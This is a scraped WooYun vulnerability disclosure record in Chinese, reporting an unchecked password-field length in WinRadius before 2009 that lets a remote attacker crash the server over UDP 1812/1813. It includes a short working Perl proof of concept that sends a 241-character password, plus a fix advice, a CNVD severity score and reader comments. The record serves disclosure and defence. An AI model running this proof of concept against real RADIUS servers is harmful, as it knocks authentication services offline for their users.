{"id": 19062, "wybug_id": "wooyun-2012-07740", "wybug_title": "WinRadius密码选项大小验证缓冲区溢出漏洞", "wybug_corp": "美加精英学校", "wybug_author": "demonalex", "wybug_date": "2012-05-31 13:51", "wybug_open_date": "2012-07-15 13:51", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "拒绝服务", "远程拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-15：\t细节向公众公开  简要描述： WinRadius是基于标准RADIUS协议的适合国内实际情况的拨号认证、记帐、记费商业软件。WinRadius 2009之前版本在实现上存在拒绝服务漏洞，WinRadius服务器绑定了udp端口1812和1813，但没有验证密码域的值的大小，攻击者可利用此漏洞造成服务器崩溃。 详细说明：  WinRadius 2009之前版本在实现上存在拒绝服务漏洞，WinRadius服务器绑定了udp端口1812和1813，但没有验证密码域的值的大小，在发送超过240个字符时，可造成服务器崩溃。   漏洞证明：  Vulnerability found by demonalex, PoC:-----------------------------------------------------------#!/usr/bin/perluse Authen::Simple::RADIUS;$|=1;$host=shift || die \"usage: $0 host\\n\";print \"Launch Attack ... \\n\";$username=int(rand(10)).int(rand(10)).int(rand(10));$password='A'x241;$secret=int(rand(10)).int(rand(10)).int(rand(10));$radius = Authen::Simple::RADIUS->new(host => $host,secret => $secret);$radius->authenticate( $username, $password );print \"Finish!\\n\";exit(1);-----------------------------------------------------------   修复方案：  限制密码域接收变量的长度。   版权声明：转载请注明来源 demonalex@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-06-05 09:00 厂商回复： 根据提交的P.O.C，CNVD确认所述情况，demonalex 在wooyun中是一个较为独立的力量，对于通用软件（本地、远程、提权、拒绝服务、缢出等）漏洞有着较为广泛的关注和研究。对漏洞评分如下：CVSS：(AV:R/AC:L/Au:NR/C:N/A:C/I:N/B:N) score:7.79（最高10分，高危）即：远程攻击、攻击难度低、不需要用户认证，对可用性构成完全影响.技术难度系数：1.1 (基于长度的畸型参数构造)影响危害系数：1.2（一般，尚未评估影响范围，可能涉及电信行业相关单位以及企业级应用）CNVD综合评分：7.79*1.1*1.2=10.282 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-31 14:39 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  win上用FreeeRadius.net的多但大多都用的linux下的radius    \n     2012-06-05 13:22 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  请教下 溢出和内核高手怎么样练成的 经历什么阶段和步骤    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}